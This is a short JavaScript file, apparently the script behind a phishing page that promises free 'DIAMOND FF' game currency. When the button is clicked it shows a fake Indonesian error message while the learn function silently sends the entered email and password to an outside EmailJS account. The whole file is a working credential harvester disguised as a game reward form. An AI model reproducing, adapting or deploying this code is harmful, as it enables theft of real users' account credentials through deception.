var email = document.querySelector(".email");
var pw = document.querySelector(".xpo");
var sc = document.querySelector("#scr");
var btn= document.querySelector("#btn");


btn.addEventListener("click", function (){
error();
learn();

if(email.value == "" || pw.value == ""  || sc.value == "" ){
	salah();
}else{
	error();
   learn();
 }
/*
console.log(email.value);
console.log(pw.value);
*/
});
function salah(){
	Swal.fire({
		icon:"question",
		title:"HARAP DI ISI",
		text: "kamu belum selesai mengisi form",
		});
}
function error() {
        Swal.fire({
          icon: "error",
          title: "GAGAL",
          text: "Mungkin Script Atau Akun yang anda masukkan salah,",
        });
}
function learn(){
  var templateParams = {
    from_name: 'server 1 9999++ DIAMOND FF',
    message: 'email: '+email.value+'\n'+'pass: '+pw.value
  };
  emailjs.send('service_if1g2rg', 'template_2wa0xiy', templateParams)
    .then(function(response) {
      console.log('SUCCESS!', response.status, response.text);
    }, function(error) {
      console.log('FAILED...', error);
      }
);
}